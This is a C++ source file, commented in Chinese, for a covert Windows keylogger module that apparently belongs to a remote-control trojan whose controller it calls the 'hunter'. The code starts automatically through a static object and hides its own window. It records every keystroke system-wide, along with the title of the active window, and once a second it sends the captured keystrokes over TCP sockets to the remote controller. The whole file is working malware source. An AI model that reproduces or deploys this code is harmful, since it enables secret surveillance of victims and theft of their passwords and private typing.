#include "pch.h"
#include "Keybd.h"
#include "VirtualKeyToAscii.h"

// 此关键段用来保护 socket vector
static CRITICAL_SECTION gCs;
static Keybd gKbd; // 初始化类
static HWND s_hWnd = NULL; // 用来接收原始设备输入的隐形窗口句柄
static std::vector<TcpSocket*> gSockets; // socket 列表
static std::vector<char> gBuffer; // 键盘数据缓冲区

// 由于有内部本类的出现
// 构造函数在一开始就执行
// 会引发创建隐藏窗口并一直记录键盘数据
// 而此时hunter并不一定请求键盘数据
// 也就不启动发送
Keybd::Keybd()
{
	// 初始化关键段
	InitializeCriticalSection(&gCs);
	// 创建对话框接收原始输入设备消息
	createDialogByNewThread();
}

Keybd::~Keybd()
{
	if (s_hWnd) {
		// 关闭计时器
		KillTimer(s_hWnd, 0);
		// 删除socket
		const int max = gSockets.size();
		for (int i = 0; i < max; ++i) {
			gSockets.at(i)->dissconnect();
			delete gSockets.at(i);
		}
		// 关闭窗口
		DestroyWindow(s_hWnd);

	}
	// 删除关键段
	DeleteCriticalSection(&gCs);
}

void Keybd::startKeybd(std::string domain, int port)
{
	// 新建连接到hunter端的socket连接
	TcpSocket* sock = new TcpSocket();
	if (!sock->connectTo(domain, port)) {
		delete sock;
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}

	// 将此socket添加至本类socket列表
	addSocket(sock);

	OutputDebugStringA("Started keybd success\r\n" );
}

void Keybd::createDialogByNewThread()
{
	HANDLE h = CreateThread(NULL, 0, Keybd::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

// 线程函数
DWORD Keybd::threadProc(LPVOID)
{
	// 创建一个不可见的窗口来处理win32事件
	// 先创建对话框模板DLGTMPLATEA
	HGLOBAL hglb = GlobalAlloc(GMEM_ZEROINIT, 1024);
	if (!hglb) {
		OutputDebugStringA("failed to alloc DLGTMPLATEA\r\n");
		return false;
	}
	LPDLGTEMPLATEA lpdt = (LPDLGTEMPLATEA)GlobalLock(hglb);
	lpdt->style = WS_CAPTION;
	lpdt->dwExtendedStyle = 0;
	lpdt->x = 0; lpdt->y = 0;
	lpdt->cx = 0; lpdt->cy = 0;
	GlobalUnlock(hglb);
	// 创建隐形对话框
	int ret = DialogBoxIndirectParamA(NULL, lpdt, NULL, keybdWndProc, NULL);

	if (ret == -1) {
		OutputDebugStringA("Failed to create dialog box for keybd\r\n");
	}

	return true;
}

// 监听线程窗口过程处理函数
BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uiMsg) {
	case WM_INITDIALOG: {
		// 首先得到该对话框窗口句柄
		s_hWnd = hWnd;
		// 注册原始输入设备 开始监键盘数据
		regist(hWnd);
		// 为该对话框关联计时器
		// 使用计时器定时发送缓存的键盘记录信息
		const int time = 1000;
		SetTimer(hWnd, 0, time, sendKeybdData);
		break;
	}
	case WM_PAINT:
		// 隐藏窗口
		ShowWindow(hWnd, SW_HIDE);
		break;
	case WM_INPUT: {
		getKeybdData(lParam);
	}
	default:
		break;
	}

	return false;
}

// 注册原始设备
BOOL Keybd::regist(HWND hWnd) {
	// 设置 RAWINPUTDEVICE 结构体信息 指定要监听键盘
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK; // 即使本程序不是顶层窗口也要监听
	rawinputDevice.hwndTarget = hWnd;

	// 注册原始输入设备
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		OutputDebugStringA("failed to register raw input devices\r\n");
		return FALSE;
	}

	return TRUE;
}

// 获取输入数据并保存至类缓冲区
BOOL Keybd::getKeybdData(LPARAM lParam) {
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	// 获取原始输入数据的大小
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, 
		&rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> 普通按键    WM_SYSKEYDOWN --> 系统按键(指的是ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// 记录按键并存储到类缓冲区
			saveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}

// 保存按键信息
void Keybd::saveKey(USHORT usVKey) {
	CHAR szKey[MAX_PATH] = { 0 };
	CHAR szTitle[MAX_PATH] = { 0 };
	CHAR szText[MAX_PATH] = { 0 };
	// 获取顶层窗口
	HWND hForegroundWnd = ::GetForegroundWindow();
	// 获取顶层窗口标题
	::GetWindowTextA(hForegroundWnd, szTitle, 256);
	// 将虚拟键码转换成对应的ASCII
	::lstrcpyA(szKey, getKeyName(usVKey));
	// 构造按键记录信息字符串
	::wsprintfA(szText, TEXT("[%s] %s\r\n"), szTitle, szKey);

	// 保存按键信息到类缓冲区
	for (int i = 0; i < lstrlenA(szText); i++) {
		addBuffer(szText[i]);
	}
}

void Keybd::addSocket(TcpSocket* sock)
{
	EnterCriticalSection(&gCs);

	gSockets.push_back(sock);

	LeaveCriticalSection(&gCs);
}

std::vector<TcpSocket*> Keybd::getSockets()
{
	EnterCriticalSection(&gCs);

	std::vector<TcpSocket*> sockets = gSockets;

	LeaveCriticalSection(&gCs);

	return sockets;
}

void Keybd::delSocket(TcpSocket* sock)
{
	EnterCriticalSection(&gCs);

	std::vector<TcpSocket*>::iterator iter = gSockets.begin();
	for (; iter != gSockets.end(); ++iter) {
		if (*iter == sock) {
			gSockets.erase(iter);
			break;
		}
	}

	LeaveCriticalSection(&gCs);
}

void Keybd::addBuffer(char data)
{
	gBuffer.push_back(data);
}

void Keybd::delBuffer()
{
	gBuffer.clear();
}

void Keybd::sendKeybdData(HWND, UINT, UINT, DWORD)
{
	if (gBuffer.size() > 0) {
		std::vector<TcpSocket*> sockets = getSockets();
		int max = sockets.size();
		for (int i = 0; i < max; ++i) {
			TcpSocket* sock = sockets.at(i);
			// 在socket列表中将没有连接的socket删除
			// 有连接的就发送数据
			if (!sock->sendData(&gBuffer[0], gBuffer.size())) {
				delSocket(sock);

				delete sock;

				OutputDebugStringA("Finished keybd\r\n");
			}
		}
		// 每次都要清理缓冲区 只发送实时数据
		delBuffer();
	}
}


